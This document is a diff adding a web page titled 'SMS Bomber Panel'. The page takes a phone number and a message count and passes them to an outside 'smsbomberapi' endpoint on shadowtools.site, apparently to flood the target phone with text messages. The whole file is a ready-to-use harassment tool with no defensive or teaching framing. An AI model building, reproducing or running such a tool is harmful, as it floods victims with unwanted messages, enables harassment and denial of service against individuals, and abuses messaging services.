@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SMS Bomber</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0d0d0d;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    input, button {
+      padding: 10px;
+      margin: 10px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+    }
+    input {
+      width: 200px;
+    }
+    button {
+      background-color: crimson;
+      color: white;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 20px;
+      font-weight: bold;
+      color: limegreen;
+    }
+  </style>
+</head>
+<body>
+  <h2>🔥 SMS Bomber Panel 🔥</h2>
+  <input type="text" id="number" placeholder="Enter Number (03xx...)">
+  <input type="number" id="amount" placeholder="Enter Amount">
+  <button onclick="sendSMS()">💣 Send Now</button>
+  <div id="status"></div>
+
+  <script>
+    function sendSMS() {
+      const number = document.getElementById("number").value;
+      const amount = document.getElementById("amount").value;
+      const status = document.getElementById("status");
+
+      if (!number || !amount) {
+        status.style.color = 'red';
+        status.textContent = "Enter both number and amount!";
+        return;
+      }
+
+      const url = `https://shadowtools.site/smsbomberapi/smsbomber.php?number=${encodeURIComponent(number)}&amount=${encodeURIComponent(amount)}`;
+
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            status.textContent = "✅ Successfully Done!";
+          } else {
+            status.style.color = 'red';
+            status.textContent = "❌ Something went wrong!";
+          }
+        })
+        .catch(error => {
+          status.style.color = 'red';
+          status.textContent = "❌ Error sending request!";
+        });
+    }
+  </script>
+</body>
+</html>
